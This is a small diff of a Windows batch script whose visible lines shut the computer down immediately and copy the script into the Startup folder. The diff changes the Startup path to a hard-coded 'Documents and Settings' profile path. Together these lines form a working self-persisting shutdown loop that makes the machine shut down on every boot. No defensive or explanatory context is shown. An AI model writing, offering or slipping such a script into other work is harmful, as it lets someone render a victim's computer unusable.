@@ -3,4 +3,4 @@ rem Shut down the computer
 shutdown /s /t 0
 
 rem Copy the batch file to Startup folder
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%~f0" "C:\Documents and Settings\Mike\Start Menu\Programs\Startup"
